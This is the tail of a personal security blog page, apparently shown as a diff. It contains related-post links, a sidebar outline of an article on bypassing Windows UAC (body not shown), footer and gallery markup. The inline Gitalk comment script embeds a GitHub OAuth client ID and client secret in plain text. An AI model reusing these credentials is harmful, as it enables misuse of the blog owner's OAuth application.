+    <a href="/p/dos%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">
+        
+        
+
+        <div class="article-image">
+            
+            <img src="/img/related-content.png" loading="lazy" 
+            data-key="" data-hash="" 
+            style="opacity: 0.3;"/>
+        </div>
+        <div class="article-details">
+            <h2 class="article-title">DoS——拒绝服务攻击</h2>
+            <footer class="article-time">
+                <time datetime=''>Feb 02, 2021</time>
+            </footer>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%981/">
+        
+        
+
+        <div class="article-image">
+            
+            <img src="/img/related-content.png" loading="lazy" 
+            data-key="" data-hash="" 
+            style="opacity: 0.3;"/>
+        </div>
+        <div class="article-details">
+            <h2 class="article-title">安全岗笔试题——1</h2>
+            <footer class="article-time">
+                <time datetime=''>Jan 29, 2021</time>
+            </footer>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/ctflearn-07601/">
+        
+        
+
+        <div class="article-image">
+            
+            <img src="/img/related-content.png" loading="lazy" 
+            data-key="" data-hash="" 
+            style="opacity: 0.3;"/>
+        </div>
+        <div class="article-details">
+            <h2 class="article-title">CTFLearn-07601</h2>
+            <footer class="article-time">
+                <time datetime=''>Sep 18, 2020</time>
+            </footer>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    <div id="gitalk-container"></div>
+
+<link rel="stylesheet" href="/resources/gitalk.css">
+<script src="/resources/gitalk.min.js"></script>
+
+<script>
+    const gitalk = new Gitalk({
+        clientID: "60cf432a89bc92763c12",
+        clientSecret: "6725615388bdb06c4050a0f6f3fa47d017fcc8d9",
+        repo: "BlogComments",
+        owner: "SGS4ever",
+        admin: ["SGS4ever"],
+        distractionFreeMode: false, 
+        id: '', 
+    });
+    (function () {
+        if (
+            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
+        ) {
+            document.getElementById("gitalk-container").innerHTML =
+                "Gitalk comments not available by default when the website is previewed locally.";
+            return;
+        }
+        gitalk.render("gitalk-container");
+    })();
+</script>
+
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 XR_G&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+            有朋自远方来，不亦说乎？ <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-uac">1 UAC</a></li>
+    <li><a href="#2-绕过uac">2 绕过UAC</a>
+      <ul>
+        <li></li>
+        <li><a href="#参考文章">参考文章</a></li>
+        <li><a href="#本文中使用的远控程序">本文中使用的远控程序</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+            </section>
+
+            
+            
+            <a id="back-to-top" href="#">
+                <img src="/img/top_hu3510154d40dce46e1c35729c8e5fbe52_10490_40x0_resize_box_3.png" />
+            </a>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Long+Cang&family=Ma+Shan+Zheng&family=Noto+Sans+SC:wght@300&family=Noto+Serif+SC:wght@300&family=Zhi+Mang+Xing&display=swap" rel="stylesheet">
+
+    </body>
+</html>
